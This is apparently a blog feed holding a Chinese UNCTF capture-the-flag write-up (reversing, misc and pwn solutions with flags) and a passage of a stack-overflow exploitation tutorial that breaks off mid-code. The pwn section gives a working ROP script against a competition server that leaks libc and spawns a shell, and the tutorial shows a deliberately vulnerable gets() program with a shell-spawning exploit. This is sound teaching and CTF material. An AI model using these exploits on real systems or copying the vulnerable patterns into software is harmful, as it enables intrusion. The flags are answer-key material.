<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[UNCTF-WP]]></title>
      <url>/2019/10/26/unctf-wp/</url>
      <content type="html"><![CDATA[<html><head></head><body><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h3><figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H177f67923b764acd81d41f273e48f59bR.png" alt title class>
                <p></p>
            </figure>

<p>有壳 且没有检测出具体壳的种类 使用ESP定律手动脱壳 </p>
<p><img src="https://ae01.alicdn.com/kf/H385b1b23dcc94510bdadae87f250ec19m.png" alt></p>
<p>已经脱掉壳了 载入dbg动态调试 单步跟几部之后发现在栈中存有flag</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H951b18e9b2884ed586e617c995e78402r.png" alt title class>
                <p></p>
            </figure>

<p>得到flag{2378b077-7d6e-4564-bdca-7eec8eede9a2}</p>
<h3 id="666"><a href="#666" class="headerlink" title="666"></a>666</h3><p>拖入IDA 看算法 在encode函数内发现主要算法 </p>
<p><img src="https://ae01.alicdn.com/kf/H2be8210dda1a4d9cbbb77b0c674efdcam.png" alt></p>
<p>同时在主函数结尾发现strcmp函数 推测是比较加密后的flag</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/He8a1df62631d402290b70f623bf887f0p.png" alt title class>
                <p></p>
            </figure>

<p>写出逆算法即可</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><iostream></span></span>
using namespace std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span><span class="token comment" spellcheck="true">//iN."K.v"w""zorhwzi</span>
    <span class="token keyword">char</span> a1<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> a2<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0x12</span><span class="token punctuation">;</span>
    cin<span class="token operator">>></span>a2<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator"><</span>key<span class="token punctuation">;</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        v4<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        v3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">;</span>
        a1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>v4<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">;</span>
        a1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>v3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token operator">^</span><span class="token number">6</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    cout<span class="token operator"><<</span>a1<span class="token punctuation">;</span>
 <span class="token punctuation">}</span> </code></pre>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hfc2b5deb6260419db18bf6bee9ab746cJ.png" alt title class>
                <p></p>
            </figure>

<p>得到flag:unctf{b66_6b6_66b}</p>
<h3 id="unctf-easy-Maze"><a href="#unctf-easy-Maze" class="headerlink" title="unctf_easy_Maze"></a>unctf_easy_Maze</h3><p>从名字中就可以推测出是迷宫题 下载附件 拖进IDA</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H527c4d5522d14ffb99fff951ccf981b1j.png" alt title class>
                <p></p>
            </figure>

<p>v9数组明显是最初始在定义数组 原本是一个个的变量 通过手动修正可以让IDA识别成为数组 步入Step0和Step1两个函数 发现是分别对原本的迷宫进行变换 而Step2函数则是接受输入 进入走迷宫的环节 在尝试下写逆算法后选择放弃 决定使用动态调试 在Step2函数前下断 找到变换完成后的迷宫即可 </p>
<blockquote>
</blockquote>
<p>第一次变换后迷宫</p>
<p>ff ff ff ff 00 00 00 00 ff ff ff ff 00 00 00 00</p>
<p>01 00 00 00 02 00 00 00 00 00 00 00 01 00 00 00</p>
<p>ff ff ff ff 00 00 00 00 ff ff ff ff 00 00 00 00</p>
<p>ff ff ff ff 01 00 00 00 ff ff ff ff 01 00 00 00</p>
<p>01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00</p>
<p>ff ff ff ff 01 00 00 00 00 00 00 00 00 00 00 00</p>
<p>00 00 00 00 00 00 00 00 ff ff ff ff 00 00 00 00</p>
<p>ff ff ff ff 00 00 00 00 00 00 00 00 01 00 00 00</p>
<p>00 00 00 00 01 00 00 00 00 00 00 00 01 00 00 00</p>
<p>00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00</p>
<p>ff ff ff ff ff ff ff ff 01 00 00 00 00 00 00 00</p>
<p>00 00 00 00 ff ff ff ff ff ff ff ff ff ff ff ff</p>
<p>01 00 00 00                                   </p>
<p>第二次变换后的迷宫</p>
<p>01 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00</p>
<p>01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
<p>00 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00</p>
<p>00 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
<p>01 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00</p>
<p>01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</p>
<p>01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00</p>
<p>01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
<p>00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00</p>
<p>00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00</p>
<p>01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
<p>01 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00</p>
<p>01 00 00 00   </p>
<blockquote>
</blockquote>
<p>在step2函数中得知迷宫为7*7迷宫 写出脚本输出迷宫</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><iostream></span></span>
using namespace std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> mazz<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"1001111101100111101110001100111100010001111111101"</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator"><</span><span class="token number">49</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">7</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            cout<span class="token operator"><<</span>endl<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        cout<span class="token operator"><<</span>mazz<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>    
<span class="token punctuation">}</span></code></pre>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H16a308588307444e99589e8d835d5845l.png" alt title class>
                <p></p>
            </figure>

<p>对照迷宫从(0,0)走到(6,6)即可 </p>
<p><img src="https://ae01.alicdn.com/kf/Ha6b282e91d8346fb9ffb4d6744471271Z.png" alt></p>
<p>得到flag:UNCTF{ssddwdwdddssaasasaaassddddwdds}</p>
<h3 id="easyvm"><a href="#easyvm" class="headerlink" title="easyvm"></a>easyvm</h3><p>这题应该我是非预期解… 没有进行算法逆向和动态调试 直接使用Python中的Angr库进行符号执行 得到flag</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H5dddc8800dcb4418b5c19e68e57f0217H.png" alt title class>
                <p></p>
            </figure>

<p>贴出脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> angr

project<span class="token operator">=</span>angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./vm"</span><span class="token punctuation">,</span>auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
state<span class="token operator">=</span>project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>
simgr<span class="token operator">=</span>project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>state<span class="token punctuation">)</span>
simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token number">0x400BDA</span><span class="token punctuation">,</span>avoid<span class="token operator">=</span><span class="token number">0x400B96</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h3 id="奇怪的数组"><a href="#奇怪的数组" class="headerlink" title="奇怪的数组"></a>奇怪的数组</h3><p>载入IDA 通过阅读主函数 知道flag的格式为flag{****}</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H0010bde43e734b52988cc085af9b232eI.png" alt title class>
                <p></p>
            </figure>

<p>步入char2hex函数查看算法 发现首先是限制输入只能为 <strong>‘0’<del>‘9’&&’a’</del>‘e’</strong> 发现后面的减法运算其实就是将字符转为数值 0~15 返回到主函数 发现在关键if判断前有一个 <strong>v9=16*v11+v10</strong> 确定是十六进制运算 <em>简单举例就是A*16+D=AD</em><br>然后将得数和程序预先设计好的checkbox数组进行比较 可以得知 程序需要的输入其实就是checkbox数组的值 </p>
<p><img src="https://ae01.alicdn.com/kf/H579884a3afc84b6b9ca56c6e424a3cd2E.png" alt></p>
<p>得到flag:flag{ad461e203c7975b35e527960cbfeb06c}</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="快乐游戏题"><a href="#快乐游戏题" class="headerlink" title="快乐游戏题"></a>快乐游戏题</h3><p>玩就完事了= =</p>
<h3 id="信号不好我先挂了"><a href="#信号不好我先挂了" class="headerlink" title="信号不好我先挂了"></a>信号不好我先挂了</h3><p>下载附件 载入Stegsolve发现存在图片隐写 且隐写数据为504B0304开头 怀疑是压缩包 直接保存成ZIP </p>
<p><img src="https://ae01.alicdn.com/kf/H98899544adbe44dfa49cc7f2f25d6efcR.png" alt></p>
<p>得到一个长得和原图一模一样的图片 使用十六进制编辑器和Stegsolve都没有发现线索 在百度过后怀疑是隐水印 使用工具BlindWaterMark尝试破解 得到flag</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hbdacf6fb10b94692b0042ab46eae90b6j.png" alt title class>
                <p></p>
            </figure>

<h3 id="Think"><a href="#Think" class="headerlink" title="Think"></a>Think</h3><p>下载附件 发现是个Python脚本 运行后输出一句</p>
<blockquote>
</blockquote>
<p>It’s a simple question. Take it easy. Don’t think too much about it.</p>
<blockquote>
</blockquote>
<p>猜测可能直接就是2019unctf 粗略阅读下代码 发现后面有base64decode 怀疑是经过base64加密后的”2019unctf” 加密后尝试 得到flag</p>
<p>flag:flag{34a94868a8ad9ff82baadb326c513d40}</p>
<h3 id="亲爱的"><a href="#亲爱的" class="headerlink" title="亲爱的"></a>亲爱的</h3><p>这真的不是社工题么… 下载后发现是mp3 音频分析后没有线索 尝试使用16进制编辑器查看 发现文件最后存有一个压缩包 </p>
<p><img src="https://ae01.alicdn.com/kf/H3957789159424e6892be90a5e079cf93O.png" alt></p>
<p>直接修改后缀 发现压缩包需要密码  尝试爆破无果 发现压缩包备注 “qmusic 2019.7.27 17:47” 在QQ音乐上的同歌曲下的评论区寻找对应评论 得到密码 “真的上头” 解压出来一张图片 拖入十六进制编辑器 发现存在压缩包</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H99778f2de6394b0b975fdca9696afc871.png" alt title class>
                <p></p>
            </figure>

<p>直接修改后缀 在压缩包 /Word/media/ 路径下发现flag图片</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hb41cabac09d74679a4b9f43f79d07c8fP.png" alt title class>
                <p></p>
            </figure>

<p>得到falg:UNCTF{W3_L0v3_Unctf}</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><p>标准的栈溢出ROP 直接贴出脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment" spellcheck="true">#sh = process("./easyrop")</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc.so"</span><span class="token punctuation">)</span>
sh<span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"101.71.29.5"</span><span class="token punctuation">,</span><span class="token string">"10041"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./easyrop"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello CTFer!"</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"d"</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x66666666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What is your name?"</span><span class="token punctuation">)</span>
ret_addr <span class="token operator">=</span> <span class="token number">0x80485FC</span>
puts_plt <span class="token operator">=</span><span class="token number">0x80483E0</span><span class="token comment" spellcheck="true"># elf.plt['puts']</span>
main_addr <span class="token operator">=</span> <span class="token number">0x8048592</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
payload <span class="token operator">=</span> <span class="token string">"d"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x14</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
shell_addr<span class="token operator">=</span> <span class="token number">0x0015902b</span><span class="token operator">+</span> libc_base

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello CTFer!"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"d"</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x66666666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What is your name?"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">"d"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x14</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>这里因为我使用的是 乌班图18.04 libc版本不同 当时本地能打通 而远程打不通 后来发现是libc问题 使用LibcSearcher拷贝了一份libc过来 所以在代码中直接引入了Libc文件</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H5d708fa87e3546bba2728aea97fb5dc1Z.png" alt title class>
                <p></p>
            </figure>

<p>得到flag:UNCTF{7ef293810e29039f061982e72fd10bfb}</p>
<p>### </p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        
        <tags>
            
            <tag> WP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[栈溢出漏洞及利用]]></title>
      <url>/2019/10/11/zhan-yi-chu/</url>
      <content type="html"><![CDATA[<html><head></head><body><h2 id="简述漏洞形成"><a href="#简述漏洞形成" class="headerlink" title="简述漏洞形成"></a>简述漏洞形成</h2><blockquote>
<p>想要了解栈溢出漏洞是怎么形成的首先要先了解下在汇编层面的函数调用和栈相关的知识</p>
<p>栈的生长方向是向低地址生长 也就是压栈时数据是先放到高地址的地方<br>这里栈的概念是和数据结构中的栈一致的 即一种<strong>FILO</strong>(first in last out)的数据结构</p>
<p>而在汇编层面上 函数调用时会进行保存现场操作 即保存函数调用前寄存器的状态 通常在进入函数体时 栈内就已经有数据了 通常的排布如下</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H38d1f8f92100468f9a51b205dea97fcak.png" alt title class>
                <p></p>
            </figure>

<p>这里参数是从左向右入栈还是从右向左入栈取决于调用方法 在这里我们不做讨论 EBP保存的是在函数调用前栈底的位置 <em>当栈清空时栈顶自然回位所以不必保存栈顶指针</em> 返回地址则保存的是当函数调用完毕后<strong>需要执行</strong>的指令地址 在函数调用结束的时候 栈的情况就是按相反方向出栈<br>即 先弹出局部变量 然后弹出EBP到EBP寄存器中 最后弹出返回地址到EIP寄存器中 而参数则是直接使用<strong>ADD ESP</strong>让他们直接消失在栈中</p>
</blockquote>
<p>在大致了解了下汇编层面的函数调用和栈知识 我们就可以来了解栈溢出漏洞是怎么造成的了..栈溢出漏洞即字面意思 就是向栈中写入了超过限定长度的数据 导致溢出的数据覆盖栈中其他数据 从而影响程序的运行</p>
<p>最开始的时候 栈溢出漏洞主要是用来破坏 即破坏程序的栈中内容 从而是程序异常退出 但是渐渐的 我们发现 如果计算好溢出数据的长度 让特定数据覆盖在原本的返回地址上 那我们即可以控制程序流向 从而达到影响系统的目的 而这种写入超过限定长度的操作主要是利用一些特定的敏感函数造成的</p>
<h2 id="敏感函数"><a href="#敏感函数" class="headerlink" title="敏感函数"></a>敏感函数</h2><h3 id="gets"><a href="#gets" class="headerlink" title="gets()"></a>gets()</h3><h4 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h4><pre class=" language-C"><code class="language-C">char *gets(char *str)</code></pre>
<h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><p>从输入缓冲区读取一个字符串存储到指针指向的内存空间 注意 使用gets()时 系统会自动将最后输入的换行符取出来然后丢弃 也就是如果后续需要继续赋值是不需要吸收回车的 但是gets()函数有一个非常大的缺陷 即他不检查预留存储区是否能够容纳实际输入的数据 简单来说就是有造成内存越界的危险</p>
<h3 id="read"><a href="#read" class="headerlink" title="read()"></a>read()</h3><h4 id="函数原型-1"><a href="#函数原型-1" class="headerlink" title="函数原型"></a>函数原型</h4><pre class=" language-C"><code class="language-C">ssize_t read(int fd,void *buf,size_t nbyte)</code></pre>
<p>fd:文件描述符 fd为0即从键盘读取<br>buf:指定的缓冲区 即指针 指向一段内存空间<br>nbyte: 要读入文件指定的字节数</p>
<h4 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h4><p>read()函数会把参数fd指向的文件传送nbyte个字节到buf指针所指的内存中 如果nbyte为0 则read()不会有任何作用并返回0 但是如果指定的字符大于缓冲区能容纳的字节数 read()函数也不会进行任何检查 即有可能造成内存越界</p>
<h3 id="strcpy-和memcpy-和strncpy"><a href="#strcpy-和memcpy-和strncpy" class="headerlink" title="strcpy()和memcpy()和strncpy()"></a>strcpy()和memcpy()和strncpy()</h3><h4 id="函数原型-2"><a href="#函数原型-2" class="headerlink" title="函数原型"></a>函数原型</h4><pre class=" language-C"><code class="language-C">char *strcpy(char *dest,const char* src)
void *memcpy(void *dest,const void *src,size_t count)
char *strncpy(char *dest,char *src,int size_t n)</code></pre>
<p>dest:指向用于储存复制内容的目标函数<br>src:要复制的字符串<br>count:要读入文件指定的字节数</p>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>strcpy()提供了字符串的复制 即strcpy()只用于字符串的复制 而且他不仅复制字符串的内容 还会复制字符串的结束符’\0’</p>
<p>复制的内容不同 strcpy()只复制字符串 而memcpy()可以复制任意内容 如字符数组 整型 结构体 类等</p>
<p>复制的方式不同 strcpy不需要指定长度 他遇到’\0’才会停止 所以可能会造成溢出 memcpy()则是根据第三个参数决定复制的长度</p>
<p>strncpy()函数 只是将src的前n个字符 复制到dest的前n个字符 不自动添加’\0’ 如果src的长度小于n个字节 则以null填充dest知道复制完n个字节</p>
<h2 id="在没有保护的情况下利用"><a href="#在没有保护的情况下利用" class="headerlink" title="在没有保护的情况下利用"></a>在没有保护的情况下利用</h2><blockquote>
<p>需要的前置知识: 基本的python语法 pwntools模块的使用语法 栈的结构 汇编层面的函数调用</p>
</blockquote>
<p>首先这是我自己写的小案例 源码如下</p>
<pre class=" language-C"><code class="language-C">#include <stdio.h>
#include <stdlib.h>

void hello()
{
      char a[100];
      gets(a);
}

void pwn()
{
      system("/bin/sh");
}

int main(void)
{
      hello();
      return 0;
}</stdlib.h></stdio.h></code></pre>
<p>在乌班图上使用GCC编译 首先我们关闭所有的保护 这里我是将程序编译成32位 64位同理</p>
<blockquote>
<p>NX：-z execstack / -z noexecstack (关闭/开启) 栈执行</p>
<p>Canary：-fno-stack-protector / -fstack-protector / -fstack-protector-all (关闭/开启/全开启) 栈中插入cookie信息</p>
<p>PIE：-no-pie / -pie (关闭/开启) 地址随机化</p>
<p>RELRO：-z norelro / -z lazy / -z now (关闭/部分开启/完全开启) 对GOT表具有写权限</p>
</blockquote>
<p>使用checksec 查看程序保护</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H4e535c2f20cf4afa80cadf6a4e66137ac.png" alt title class>
                <p></p>
            </figure>

<p><em>这里我忘记关闭RELRO保护了</em></p>
<p>打开IDA 反编译一下 发现所有函数都正常读入</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hed74694200524a87b334d09a04ad627dK.png" alt title class>
                <p></p>
            </figure>

<p>阅读源码 发现在hello()函数中存在敏感函数gets() 确定溢出点 在IDA中双击s查看栈图</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H21f396218fab4b79b76116dc1145db58r.png" alt title class>
                <p></p>
            </figure>

<p>栈图如下 可以发现 变量s的初始地址到返回地址的偏移是 6C+4=70个字节 那我们的基本思路就是 向程序中填入70个无用字节 然后将返回地址覆盖成函数pwn()的地址 这样我们就可以拿到终端</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hf4f1fafc469b47f4959eee1d90db3989H.png" alt title class>
                <p></p>
            </figure>

<p>那么使用pwntools库进行脚本的编写 </p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">"1"</span><span class="token operator">*</span><span class="token number">0x70</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x804847E</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>执行脚本 得到终端</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H8a387bd208744392bc1b83f5d63151234.png" alt title class>
                <p></p>
            </figure>

<p>在没有保护的情况下 利用完毕</p>
<h2 id="在有Canary保护的情况下的利用"><a href="#在有Canary保护的情况下的利用" class="headerlink" title="在有Canary保护的情况下的利用"></a>在有Canary保护的情况下的利用</h2><p>绕过Canary保护的的方法主要有两种分别都有各自的局限性 </p>
<p>第一种就是利用程序的格式化字符串漏洞泄漏出指定位置的Canary值 当然 这种方法的前提就是程序中存在格式化字符串漏洞… </p>
<p>第二种方法就是利用溢出 直接将字符串覆盖到Canary值 然后在输出的时候直接输出出来 这种方法的局限性是要求读入字符串的函数 不会将00加入到字符串尾 不然会直接截断字符串 导致不能将Canary值带出来 </p>
<p>下面分别给出两种情况的案例 来绕过Canary保护</p>
<h3 id="配合格式化字符串绕过"><a href="#配合格式化字符串绕过" class="headerlink" title="配合格式化字符串绕过"></a>配合格式化字符串绕过</h3><p>首先给出案例代码</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>

<span class="token keyword">void</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
      <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
      <span class="token keyword">int</span> sign<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>sign<span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
            <span class="token function">gets</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
